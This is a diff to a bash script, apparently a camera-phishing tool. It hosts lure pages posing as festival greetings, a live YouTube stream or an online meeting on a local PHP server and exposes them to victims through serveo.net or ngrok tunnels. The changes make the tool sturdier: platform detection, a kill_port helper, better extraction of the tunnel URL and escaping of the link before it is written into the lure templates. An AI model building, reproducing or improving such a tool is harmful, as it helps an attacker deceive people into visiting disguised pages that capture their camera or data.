@@ -5,6 +5,52 @@
 
 trap 'printf "\n";stop' 2
 
+# Platform detection
+PLATFORM="$(uname -s 2>/dev/null || echo Unknown)"
+IS_DARWIN=false
+IS_LINUX=false
+IS_TERMUX=false
+IS_WINDOWS=false
+case "$PLATFORM" in
+	Darwin*) IS_DARWIN=true ;; 
+	Linux*) 
+		IS_LINUX=true
+		# detect Termux (Android) by presence of /data/data/com.termux
+		if [ -d "/data/data/com.termux" ] || [ -n "$PREFIX" -a "$PREFIX" = "/data/data/com.termux/files/usr" ]; then
+			IS_TERMUX=true
+		fi
+		;;
+	MINGW*|MSYS*|CYGWIN*) IS_WINDOWS=true ;; 
+	*) ;;
+esac
+
+# Portable check for command
+has_cmd() { command -v "$1" >/dev/null 2>&1; }
+
+# Kill processes listening on a port (portable across fuser/lsof/netstat)
+kill_port() {
+	port="$1"
+	if has_cmd fuser; then
+		fuser -k ${port}/tcp > /dev/null 2>&1 || true
+		return
+	fi
+	if has_cmd lsof; then
+		pids=$(lsof -t -i tcp:"${port}" 2>/dev/null || true)
+		if [ -n "$pids" ]; then
+			echo "$pids" | xargs -r kill -2 >/dev/null 2>&1 || true
+			return
+		fi
+	fi
+	if has_cmd netstat && has_cmd awk && has_cmd grep; then
+		# try to find PID from netstat (platform-dependent output)
+		pid=$(netstat -nlp 2>/dev/null | grep ":${port} " | awk '{print $7}' | cut -d'/' -f1 | head -n1)
+		if [ -n "$pid" ]; then
+			kill -2 "$pid" >/dev/null 2>&1 || true
+			return
+		fi
+	fi
+}
+
 banner() {
 clear
 printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
@@ -33,12 +79,22 @@ printf "\n"
 }
 
 dependencies() {
-
-
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting. LAH LU MAH :>"; exit 1; }
- 
-
-
+	# Basic dependencies; be permissive and show clear guidance for Windows
+	if ! has_cmd php ; then
+		echo >&2 "I require php but it's not installed. Install it (php-cli). Aborting."; exit 1;
+	fi
+	if ! has_cmd curl ; then
+		echo >&2 "Warning: 'curl' not found. Some operations may fail. Install curl for best results.";
+	fi
+	if ! has_cmd ssh && ! $IS_WINDOWS ; then
+		echo >&2 "Warning: 'ssh' not found. Serveo option requires ssh. Install OpenSSH.";
+	fi
+	if ! has_cmd unzip && ! $IS_WINDOWS ; then
+		echo >&2 "Warning: 'unzip' not found. Ngrok autoinstall may fail. Install unzip/wget.";
+	fi
+	if $IS_WINDOWS ; then
+		echo "Running on Windows environment detected. For full functionality use WSL, Git-Bash, Cygwin or Termux on Android. Script may not work natively on Windows CMD/Powershell.";
+	fi
 }
 
 stop() {
@@ -101,7 +157,7 @@ done
 
 server() {
 
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting. Maka nya inst :>all Dulu Jangan Ke Dia  Mulu"; exit 1; }
+has_cmd ssh || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
 printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo Sever Hatinya...\e[0m\n"
 
@@ -111,36 +167,45 @@ fi
 
 if [[ $subdomain_resp == true ]]; then
 
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+$(which sh) -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R ${subdomain}:80:localhost:3333 serveo.net > sendlink 2>&1" &
 
-sleep 8
+sleep 10
 else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
+$(which sh) -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1" &
 
-sleep 8
+sleep 10
 fi
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server Bukan PHP In Dia yehhh... (localhost:3333)\e[0m\n"
-fuser -k 3333/tcp > /dev/null 2>&1
+kill_port 3333
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
+# extract serveo url (allow hyphens, dots and mixed case) and set link for downstream use
+send_link=$(grep -o "https://[0-9A-Za-z.-]*\.serveo.net" sendlink | head -n1)
+link="$send_link"
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' "$link"
 
 }
 
 
 payload_ngrok() {
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
-sed 's+forwarding_link+'$link'+g' template.php > index.php
+# try to read public_url from ngrok's local API (handles ngrok.io, ngrok-free.app, etc.)
+link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"https://[^\"]*' | head -n1 | cut -d'"' -f4)
+if [[ -z "$link" ]]; then
+	# fallback: any https url in the API response
+	link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/\"]*' | head -n1)
+fi
+# escape '&' in link to avoid sed replacement issues
+link_esc=$(printf '%s' "$link" | sed 's/[&]/\\&/g')
+sed 's+forwarding_link+'"$link_esc"'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+forwarding_link+'"$link_esc"'+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+forwarding_link+'"$link_esc"'+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+sed 's+forwarding_link+'"$link_esc"'+g' OnlineMeeting.html > index2.html
 fi
 rm -rf index3.html
 
@@ -235,27 +300,45 @@ exit 1
 fi
 fi
 fi
+
+# Ngrok authtoken setup - automatic and flexible
+printf "\e[1;92m[\e[0m+\e[1;92m] Configuring ngrok authtoken...\n"
 if [[ -e ~/.ngrok2/ngrok.yml ]]; then
-printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
-cat  ~/.ngrok2/ngrok.yml
-read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken Bukan Ganti Dia Yee? [Y/n]:\e[0m ' chg_token
-if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken Lu mah: \e[0m' ngrok_auth
-./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed Nice\n"
-fi
+	printf "\e[1;93m[\e[0m*\e[1;93m] ngrok authtoken already configured.\n"
+	read -p $'\e[1;92m[\e[0m+\e[1;92m] Use existing token or enter new one? (E=existing / N=new) [Default: E]: \e[0m' token_choice
+	token_choice="${token_choice:-E}"
+	if [[ "$token_choice" == "N" || "$token_choice" == "n" ]]; then
+		read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter your ngrok authtoken: \e[0m' ngrok_auth
+		if [[ -n "$ngrok_auth" ]]; then
+			./ngrok authtoken "$ngrok_auth" > /dev/null 2>&1
+			sleep 1
+			printf "\e[1;92m[\e[0m*\e[1;92m] Authtoken updated.\n"
+		fi
+	fi
 else
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken Lu mah: \e[0m' ngrok_auth
-./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
+	printf "\e[1;93m[\e[0m*\e[1;93m] No ngrok authtoken found. Getting one from https://dashboard.ngrok.com/auth/your-authtoken\n"
+	read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter your ngrok authtoken: \e[0m' ngrok_auth
+	if [[ -n "$ngrok_auth" ]]; then
+		./ngrok authtoken "$ngrok_auth" > /dev/null 2>&1
+		sleep 1
+		printf "\e[1;92m[\e[0m*\e[1;92m] Authtoken configured.\n"
+	else
+		printf "\e[1;31m[!] No authtoken provided. Cannot continue.\n"
+		exit 1
+	fi
 fi
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server Bukan PHP In dia yeh...\n"
+
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server (localhost:3333)...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server very Gang very well gak begang gak weel...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok tunnel...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"https://[^\"]*' | head -n1 | cut -d'"' -f4)
+if [[ -z "$link" ]]; then
+	link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/\"]*' | head -n1)
+fi
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason lahh  \e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid lu mah\n"
@@ -284,7 +367,7 @@ option_server="${option_server:-${default_option_server}}"
 select_template
 if [[ $option_server -eq 2 ]]; then
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting. Lah Lu mah"; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 start
 
 elif [[ $option_server -eq 1 ]]; then
@@ -301,16 +384,19 @@ fi
 
 payload() {
 
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-sed 's+forwarding_link+'$send_link'+g' template.php > index.php
+send_link=$(grep -o "https://[0-9A-Za-z.-]*\.serveo.net" sendlink | head -n1)
+link="$send_link"
+# escape '&' in link to avoid sed replacement issues
+link_esc=$(printf '%s' "$link" | sed 's/[&]/\\&/g')
+sed 's+forwarding_link+'"$link_esc"'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+forwarding_link+'"$link_esc"'+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+forwarding_link+'"$link_esc"'+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index3.html
+sed 's+forwarding_link+'"$link_esc"'+g' OnlineMeeting.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 fi
 rm -rf index3.html
